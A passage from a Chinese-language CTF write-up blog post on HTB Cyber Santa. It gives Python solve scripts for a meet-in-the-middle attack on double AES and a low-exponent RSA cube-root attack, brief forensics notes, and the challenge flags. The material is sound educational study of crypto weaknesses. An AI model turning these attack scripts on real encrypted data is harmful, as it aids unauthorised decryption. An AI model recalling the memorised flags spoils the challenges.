: <span class="number">224</span>,<span class="number">41</span> : <span class="number">225</span>,<span class="number">210</span> : <span class="number">226</span>,<span class="number">123</span> : <span class="number">227</span>,<span class="number">36</span> : <span class="number">228</span>,<span class="number">205</span> : <span class="number">229</span>,<span class="number">118</span> : <span class="number">230</span>,<span class="number">31</span> : <span class="number">231</span>,<span class="number">200</span> : <span class="number">232</span>,<span class="number">113</span> : <span class="number">233</span>,<span class="number">26</span> : <span class="number">234</span>,<span class="number">195</span> : <span class="number">235</span>,<span class="number">108</span> : <span class="number">236</span>,<span class="number">21</span> : <span class="number">237</span>,<span class="number">190</span> : <span class="number">238</span>,<span class="number">103</span> : <span class="number">239</span>,<span class="number">16</span> : <span class="number">240</span>,<span class="number">185</span> : <span class="number">241</span>,<span class="number">98</span> : <span class="number">242</span>,<span class="number">11</span> : <span class="number">243</span>,<span class="number">180</span> : <span class="number">244</span>,<span class="number">93</span> : <span class="number">245</span>,<span class="number">6</span> : <span class="number">246</span>,<span class="number">175</span> : <span class="number">247</span>,<span class="number">88</span> : <span class="number">248</span>,<span class="number">1</span> : <span class="number">249</span>,<span class="number">170</span> : <span class="number">250</span>,<span class="number">83</span> : <span class="number">251</span>,<span class="number">252</span> : <span class="number">252</span>,<span class="number">165</span> : <span class="number">253</span>,<span class="number">78</span> : <span class="number">254</span>,<span class="number">247</span> : <span class="number">255</span>&#125;</span><br><span class="line"><span class="comment"># print(&quot;&#123;&quot;)</span></span><br><span class="line"><span class="comment"># for i in range(256):</span></span><br><span class="line"><span class="comment">#   print((169*i+160)%256,&quot;:&quot;, i, end=&#x27;&#x27;)</span></span><br><span class="line"><span class="comment">#   print(&#x27;,&#x27;, end=&#x27;&#x27;)</span></span><br><span class="line"><span class="comment"># print(&quot;&#125;&quot;)</span></span><br><span class="line"></span><br><span class="line">plain = <span class="string">b&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> enc:</span><br><span class="line">  plain += <span class="built_in">bytes</span>([table[i]])</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;flag.pdf&#x27;</span>,<span class="string">&#x27;wb+&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">  f.write(plain)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;succesas&quot;</span>)</span><br></pre></td></tr></table></figure>
<hr>
<h3 id="meet-me-halfway">meet me halfway</h3>
<p>题目是可以类似一个double AES加密，可以使用中间相遇攻击：</p>
<p>原理是加密密钥空间是可以穷尽的，因此可以加密和解密的密文和解密的密文中间相遇来破解密文。</p>
<p>exp:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line">enc = <span class="string">&#x27;945e46f641e89b5ee6f15347fa3d9a5e&#x27;</span></span><br><span class="line">dt = json.loads(<span class="built_in">input</span>().strip())</span><br><span class="line">pt = <span class="built_in">bytes</span>.fromhex(dt[<span class="string">&#x27;pt&#x27;</span>])</span><br><span class="line">enc = <span class="string">&#x27;e1bd399e40ca60f25c65c2c0cc78e5f5&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">my_enc</span>(<span class="params">data, key</span>):</span><br><span class="line">    cipher = AES.new(key, mode=AES.MODE_ECB)</span><br><span class="line">    ct = cipher.encrypt(pad(data, <span class="number">16</span>))</span><br><span class="line">    <span class="keyword">return</span> ct.<span class="built_in">hex</span>()</span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">my_dec</span>(<span class="params">data, key</span>):</span><br><span class="line">    cipher = AES.new(key, mode=AES.MODE_ECB)</span><br><span class="line">    ct = cipher.decrypt(data)</span><br><span class="line">    <span class="keyword">return</span> ct.<span class="built_in">hex</span>()</span><br><span class="line">aa = []</span><br><span class="line">ff = my_dec(<span class="built_in">bytes</span>.fromhex(enc), <span class="string">b&#x27;a4a7cyb3rXm45!@#&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> a <span class="keyword">in</span> alphabet:</span><br><span class="line">    <span class="keyword">for</span> b <span class="keyword">in</span> alphabet:</span><br><span class="line">        <span class="keyword">for</span> c <span class="keyword">in</span> alphabet:</span><br><span class="line">            <span class="keyword">for</span> d <span class="keyword">in</span> alphabet:</span><br><span class="line">                <span class="comment"># tmp = b&#x27;&#x27;</span></span><br><span class="line">                tmp = (<span class="built_in">chr</span>(a)+<span class="built_in">chr</span>(b)+<span class="built_in">chr</span>(c)+<span class="built_in">chr</span>(d))</span><br><span class="line">                tmp =  <span class="built_in">bytes</span>(tmp, encoding = <span class="string">&quot;utf8&quot;</span>)</span><br><span class="line">                key1 = const+tmp</span><br><span class="line">                <span class="keyword">if</span> (my_enc(<span class="string">b&#x27;22&#x27;</span>, key1))==ff:</span><br><span class="line">                    <span class="built_in">print</span>(key1)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> a <span class="keyword">in</span> alphabet:</span><br><span class="line">    <span class="keyword">for</span> b <span class="keyword">in</span> alphabet:</span><br><span class="line">        <span class="keyword">for</span> c <span class="keyword">in</span> alphabet:</span><br><span class="line">            <span class="keyword">for</span> d <span class="keyword">in</span> alphabet:</span><br><span class="line">                <span class="comment"># tmp = b&#x27;&#x27;</span></span><br><span class="line">                tmp = (<span class="built_in">chr</span>(a)+<span class="built_in">chr</span>(b)+<span class="built_in">chr</span>(c)+<span class="built_in">chr</span>(d))</span><br><span class="line">                tmp =  <span class="built_in">bytes</span>(tmp, encoding = <span class="string">&quot;utf8&quot;</span>)</span><br><span class="line">                key2 = tmp+const</span><br><span class="line">                dd = my_dec(<span class="built_in">bytes</span>.fromhex(enc), key2)</span><br><span class="line">                <span class="keyword">if</span> dd <span class="keyword">in</span> aa:</span><br><span class="line">                    <span class="built_in">print</span>(key2)</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line">key1=<span class="string">b&#x27;cyb3rXm45!@#de99&#x27;</span></span><br><span class="line">key2 = <span class="string">b&#x27;a4a7cyb3rXm45!@#&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decrypt</span>(<span class="params">data, key1, key2</span>):</span><br><span class="line">    cipher = AES.new(key2, mode=AES.MODE_ECB)</span><br><span class="line">    ct = cipher.decrypt(data)</span><br><span class="line">    cipher = AES.new(key1, mode=AES.MODE_ECB)</span><br><span class="line">    ct = cipher.decrypt(ct)</span><br><span class="line">    <span class="keyword">return</span> ct.<span class="built_in">hex</span>()</span><br><span class="line"></span><br><span class="line">enc = <span class="built_in">bytes</span>.fromhex(<span class="string">&#x27;44f69714caa68aeb2885e5f131c04fd24c403824198fdd7031c3a8fa7e5acc554c9dc83abbdf34ba405ddc4004c6709bb310694ac6c244d7973292d96af8f6ab8809603906420e3565b43e5b71be95994ba100ed9a00491e5c293a9cd4e618bb&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">bytes</span>.fromhex(decrypt(enc, key1, key2)))</span><br></pre></td></tr></table></figure>
<p>flag: <code>HTB&#123;m337_m3_1n_7h3_m1ddl3_0f_3ncryp710n&#125;</code></p>
<hr>
<h3 id="Missing-Reindeer">Missing Reindeer</h3>
<p>使用文本编辑器打开文件eml文件，得到key文件和加密base64加密后的密文：</p>
<p><img src="https://s2.loli.net/2022/01/02/OqKibGdoATcDJak.png" alt="image"></p>
<p>邮件提取public.der, 用openssl解析得到：</p>
<p><code>openssl rsa -pubin -text -modulus -in public.der</code></p>
<p><img src="https://s2.loli.net/2022/01/02/TaktBiSX3rWOcVs.png" alt="image"></p>
<p>低指数攻击：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line">n = <span class="number">0xE623972884B1F4D722BDD5EE5BEB84CB84760C2ED0FFAFD93CD6030FB20D7930903BD1731DC74C954A23075303DFD71B885CD66E985BF759ED17A985F7E7D837C857BD31A147D74DA261492858FA5FCFB89230878EF4FFFCFF92FC292989326454AFB51BB7AB253FEFD5B357BF83A639F153204AFC5628F3E02022C6949DC23CB19D2FD639B6D5987AC332A01DD23B437A6777BB967F80E522E941E5F972160AED556DB7393919806422AE1A7DC9B19996FDB7B29141472D6803DFF42A713DB57AC078FCA48D1A6861423DE3A12ED9CFAFB831E5D69B92D71963D023228C2612EA334A652C46121F505D1B5A551224C69FC8239CFE1093DE68095F7153159667</span></span><br><span class="line">e = <span class="number">3</span></span><br><span class="line">c = bytes_to_long(base64.b64decode(<span class="string">&quot;Ci95oTkIL85VWrJLVhns1O2vyBeCd0weKp9o3dSY7hQl7CyiIB/D3HaXQ619k0+4FxkVEksPL6j3wLp8HMJAPxeA321RZexR9qwswQv2S6xQ3QFJi6sgvxkN0YnXtLKRYHQ3te1Nzo53gDnbvuR6zWV8fdlOcBoHtKXlVlsqODku2GvkTQ/06x8zOAWgQCKj78V2mkPiSSXf2/qfDp+FEalbOJlILsZMe3NdgjvohpJHN3O5hLfBPdod2v6iSeNxl7eVcpNtwjkhjzUx35SScJDzKuvAv+6DupMrVSLUfcWyvYUyd/l4v01w+8wvPH9l&quot;</span>))</span><br><span class="line">i = <span class="number">0</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    tmp = (i*n)+c</span><br><span class="line">    i+=<span class="number">1</span></span><br><span class="line">    <span class="keyword">if</span> gmpy2.iroot(tmp, e)[<span class="number">1</span>]:</span><br><span class="line">        <span class="built_in">print</span>(gmpy2.iroot(tmp, e)[<span class="number">0</span>])</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(<span class="number">1557557083543814172336607163260092833421057646019104960727073356364066073441281899179702244042726263049650591998409092023301232930288444853604698625348475061214874927442198998278165154227631741</span>))</span><br></pre></td></tr></table></figure>
<p><img src="https://s2.loli.net/2022/01/02/Zu7Cyj4J6BhNT8i.png" alt="image"></p>
<p>flag:<code>HTB&#123;w34k_3xp0n3n7_ffc896&#125;</code></p>
<hr>
<h2 id="Forensics">Forensics</h2>
<h3 id="baby-APT">baby APT</h3>
<p>简单流量分析：</p>
<p><img src="https://s2.loli.net/2022/01/02/RCDJl3zIeZx94LP.png" alt="image"></p>
<p>解base64：</p>
<p><img src="https://s2.loli.net/2022/01/02/PRaML2OVpd1hSJQ.png" alt="image"></p>
<p>flag : <code>HTB&#123;0k_n0w_3v3ry0n3_h4s_t0_dr0p_0ff_th3ir_l3tt3rs_4t_th3_p0st_0ff1c3_4g41n&#125;</code></p>
<hr>
<h3 id="giveaway">giveaway</h3>
<p>宏中藏有flag：</p>
<p><img src="https://s2.loli.net/2022/01/02/c3FmwaMt2V5sS7Y.png" alt="image"></p>
<p>flag:<code>HTB&#123;Th1s_1s_4_pr3s3nt_3v3ryb0dy_w4nts_f0r_chr1stm4s&#125;</code></p>

    </div>

    
    
    

      <footer class="post-footer">
          <div class="post-tags">
              <a href="/tags/HTB/" rel="tag"># HTB</a>
              <a href="/tags/CTF/" rel="tag"># CTF</a>
          </div>

        


        
    <div class="post-nav">
      <div class="post-nav-item">
    <a href="/2021/10/07/CTF/toxin/" rel="prev" title="toxin">
      <i class="fa fa-chevron-left"></i> toxin
    </a></div>
      <div class="post-nav-item">
    <a href="/2022/11/13/%E5%AD%A6%E4%B9%A0/RL/MDP-2/" rel="next" title="MDP">
      MDP <i class="fa fa-chevron-right"></i>
    </a></div>
    </div>
      </footer>
    
  </article>
  
  
  



          </div>
          
    <div class="comments" id="valine-comments"></div>

<script>
  window.addEventListener('tabs:register', () => {
    let { activeClass } = CONFIG.comments;
    if (CONFIG.comments.storage) {
      activeClass = localStorage.getItem('comments_active') || activeClass;
    }
    if (activeClass) {
      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
      if (activeTab) {
        activeTab.click();
      }
    }
  });
  if (CONFIG.comments.storage) {
    window.addEventListener('tabs:click', event => {
      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
      let commentClass = event.target.classList[1];
      localStorage.setItem('comments_active', commentClass);
    });
  }
</script>

        </div>
          
  
  <div class="toggle sidebar-toggle">
    <span class="toggle-line toggle-line-first"></span>
    <span class="toggle-line toggle-line-middle"></span>
    <span class="toggle-line toggle-line-last"></span>
  </div>

  <aside class="sidebar">
    <div class="sidebar-inner">

      <ul class="sidebar-nav motion-element">
        <li class="sidebar-nav-toc">
          Table of Contents
        </li>
        <li class="sidebar-nav-overview">
          Overview
        </li>
      </ul>

      <!--noindex-->
      <div class="post-toc-wrap sidebar-panel">
          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link"><span class="nav-number">1.</span> <span class="nav-text">HTB-Cyber Santa</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#WEB"><span class="nav-number">1.1.</span> <span class="nav-text">WEB</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Toy-Workshop"><span class="nav-number">1.1.1.</span> <span class="nav-text">Toy Workshop</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Toy-Management"><span class="nav-number">1.1.2.</span> <span class="nav-text">Toy Management</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#REV"><span class="nav-number">1.2.</span> <span class="nav-text">REV</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Infiltration"><span class="nav-number">1.2.1.</span> <span class="nav-text">Infiltration</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Gift-Wrapping"><span class="nav-number">1.2.2.</span> <span class="nav-text">Gift Wrapping</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Intercept"><span class="nav-number">1.2.3.</span> <span class="nav-text">Intercept</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Upgraded"><span class="nav-number">1.2.4.</span> <span class="nav-text">Upgraded</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Bamboozled"><span class="nav-number">1.2.5.</span> <span class="nav-text">Bamboozled</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#PWN"><span class="nav-number">1.3.</span> <span class="nav-text">PWN</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Mr-Snowy"><span class="nav-number">1.3.1.</span> <span class="nav-text">Mr Snowy</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Sleigh"><span class="nav-number">1.3.2.</span> <span class="nav-text">Sleigh</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Naughty-list"><span class="nav-number">1.3.3.</span> <span class="nav-text">Naughty_list</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Minimelfistic"><span class="nav-number">1.3.4.</span> <span class="nav-text">Minimelfistic</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Music-Notes"><span class="nav-number">1.3.5.</span> <span class="nav-text">Music Notes</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Crypt"><span class="nav-number">1.4.</span> <span class="nav-text">Crypt</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Common-Mistake"><span class="nav-number">1.4.1.</span> <span class="nav-text">Common Mistake</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#XMAS-Spirit"><span class="nav-number">1.4.2.</span> <span class="nav-text">XMAS Spirit</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#meet-me-halfway"><span class="nav-number">1.4.3.</span> <span class="nav-text">meet me halfway</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Missing-Reindeer"><span class="nav-number">1.4.4.</span> <span class="nav-text">Missing Reindeer</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Forensics"><span class="nav-number">1.5.</span> <span class="nav-text">Forensics</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#baby-APT"><span class="nav-number">1.5.1.</span> <span class="nav-text">baby APT</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#giveaway"><span class="nav-number">1.5.2.</span> <span class="nav-text">giveaway</span></a></li></ol></li></ol></li></ol></div>
      </div>
      <!--/noindex-->

      <div class="site-overview-wrap sidebar-panel">
        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
    <img class="site-author-image" itemprop="image" alt="ch3cke"
      src="/images/avatar.gif">
  <p class="site-author-name" itemprop="name">ch3cke</p>
  <div class="site-description" itemprop="description">万物皆虚，万事皆允</div>
</div>
<div class="site-state-wrap motion-element">
  <nav class="site-state">
      <div class="site-state-item site-state-posts">
          <a href="/archives/">
        
          <span class="site-state-item-count">21</span>
          <span class="site-state-item-name">posts</span>
        </a>
      </div>
      <div class="site-state-item site-state-categories">
        <span class="site-state-item-count">6</span>
        <span class="site-state-item-name">categories</span>
      </div>
      <div class="site-state-item site-state-tags">
            <a href="/tags/">
          
        <span class="site-state-item-count">20</span>
        <span class="site-state-item-name">tags</span></a>
      </div>
  </nav>
</div>
  <div class="links-of-author motion-element">
      <span class="links-of-author-item">
        <a href="https://github.com/ch3cke" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;ch3cke" rel="noopener" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
      </span>
      <span class="links-of-author-item">
        <a href="/atom.xml" title="RSS → &#x2F;atom.xml"><i class="fas fa-rss fa-fw"></i>RSS</a>
      </span>
  </div>



      </div>

    </div>
  </aside>
  <div id="sidebar-dimmer"></div>


      </div>
    </main>

    <footer class="footer">
      <div class="footer-inner">
        

        

<div class="copyright">
  
  &copy; 
  <span itemprop="copyrightYear">2022</span>
  <span class="with-love">
    <i class="fa fa-heart"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">ch3cke</span>
    <span class="post-meta-divider">|</span>
    <span class="post-meta-item-icon">
      <i class="fa fa-chart-area"></i>
    </span>
      <span class="post-meta-item-text">Symbols count total: </span>
    <span title="Symbols count total">141k</span>
    <span class="post-meta-divider">|</span>
    <span class="post-meta-item-icon">
      <i class="fa fa-coffee"></i>
    </span>
      <span class="post-meta-item-text">Reading time total &asymp;</span>
    <span title="Reading time total">2:08</span>
</div><script color="0,0,255" opacity="0.5" zIndex="-1" count="99" src="https://cdn.jsdelivr.net/npm/canvas-nest.js@1/dist/canvas-nest.js"></script>

        






<script>
  (function() {
    function leancloudSelector(url) {
      url = encodeURI(url);
      return document.getElementById(url).querySelector('.leancloud-visitors-count');
    }

    function addCount(Counter) {
      var visitors = document.querySelector('.leancloud_visitors');
      var url = decodeURI(visitors.id);
      var title = visitors.dataset.flagTitle;

      Counter('get', '/classes/Counter?where=' + encodeURIComponent(JSON.stringify({ url })))
        .then(response => response.json())
        .then(({ results }) => {
          if (results.length > 0) {
            var counter = results[0];
            leancloudSelector(url).innerText = counter.time + 1;
            Counter('put', '/classes/Counter/' + counter.objectId, { time: { '__op': 'Increment', 'amount': 1 } })
              .catch(error => {
                console.error('Failed to save visitor count', error);
              });
          } else {
              leancloudSelector(url).innerText = 'Counter not initialized! More info at console err msg.';
              console.error('ATTENTION! LeanCloud counter has security bug, see how to solve it here: https://github.com/theme-next/hexo-leancloud-counter-security. \n However, you can still use LeanCloud without security, by setting `security` option to `false`.');
            
          }
        })
        .catch(error => {
          console.error('LeanCloud Counter Error', error);
        });
    }

    function showTime(Counter) {
      var visitors = document.querySelectorAll('.leancloud_visitors');
      var entries = [...visitors].map(element => {
        return decodeURI(element.id);
      });

      Counter('get', '/classes/Counter?where=' + encodeURIComponent(JSON.stringify({ url: { '$in': entries } })))
        .then(response => response.json())
        .then(({ results }) => {
          for (let url of entries) {
            let target = results.find(item => item.url === url);
            leancloudSelector(url).innerText = target ? target.time : 0;
          }
        })
        .catch(error => {
          console.error('LeanCloud Counter Error', error);
        });
    }

    let { app_id, app_key, server_url } = {"enable":true,"app_id":"jXRYdAHIc85p63qqPqoov6rQ-MdYXbMMI","app_key":"1JUgviDin9HY4U3bG0KOmBL2","server_url":"https://jxrydahi.api.lncldglobal.com","security":true};
    function fetchData(api_server) {
      var Counter = (method, url, data) => {
        return fetch(`${api_server}/1.1${url}`, {
          method,
          headers: {
            'X-LC-Id'     : app_id,
            'X-LC-Key'    : app_key,
            'Content-Type': 'application/json',
          },
          body: JSON.stringify(data)
        });
      };
      if (CONFIG.page.isPost) {
        if (CONFIG.hostname !== location.hostname) return;
        addCount(Counter);
      } else if (document.querySelectorAll('.post-title-link').length >= 1) {
        showTime(Counter);
      }
    }

    let api_server = app_id.slice(-9) !== '-MdYXbMMI' ? server_url : `https://${app_id.slice(0, 8).toLowerCase()}.api.lncldglobal.com`;

    if (api_server) {
      fetchData(api_server);
    } else {
      fetch('https://app-router.leancloud.cn/2/route?appId=' + app_id)
        .then(response => response.json())
        .then(({ api_server }) => {
          fetchData('https://' + api_server);
        });
    }
  })();
</script>


      </div>
    </footer>
  </div>

  
  <script src="/lib/anime.min.js"></script>
  <script src="/lib/velocity/velocity.min.js"></script>
  <script src="/lib/velocity/velocity.ui.min.js"></script>

<script src="/js/utils.js"></script>

<script src="/js/motion.js"></script>


<script src="/js/schemes/pisces.js"></script>


<script src="/js/next-boot.js"></script>

<script src="/js/bookmark.js"></script>




  




  
<script src="/js/local-search.js"></script>













  

  

  


<script>
NexT.utils.loadComments(document.querySelector('#valine-comments'), () => {
  NexT.utils.getScript('//cdnjs.cloudflare.com/ajax/libs/valine/1.3.10/Valine.min.js', () => {
    var GUEST = ['nick', 'mail', 'link'];
    var guest = 'nick,mail,link';
    guest = guest.split(',').filter(item => {
      return GUEST.includes(item);
    });
    new Valine({
      el         : '#valine-comments',
      verify     : false,
      notify     : false,
      appId      : 'jXRYdAHIc85p63qqPqoov6rQ-MdYXbMMI',
      appKey     : '1JUgviDin9HY4U3bG0KOmBL2',
      placeholder: "Just go go",
      avatar     : 'mm',
      meta       : guest,
      pageSize   : '10' || 10,
      visitor    : false,
      lang       : 'zh-cn' || 'zh-cn',
      path       : location.pathname,
      recordIP   : true,
      serverURLs : 'http://jxrydahi.api.lncldglobal.com',
      master     : 'ee058ac8ed74345918b654e1728cec44',
      friends    : '5219ff81ed07a62c7504d84162c40ef8'
    });
  }, window.Valine);
});
</script>

  

  <script async src="/js/cursor/fireworks.js"></script>




  <script src="/js/activate-power-mode.min.js"></script>
  <script>
    POWERMODE.colorful = true;
    POWERMODE.shake = false;
    document.body.addEventListener('input', POWERMODE);
  </script>


<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"model":{"jsonPath":"/live2dw/assets/wanko.model.json"},"display":{"position":"right","width":150,"height":300},"mobile":{"show":false},"log":false});</script></body>
</html>
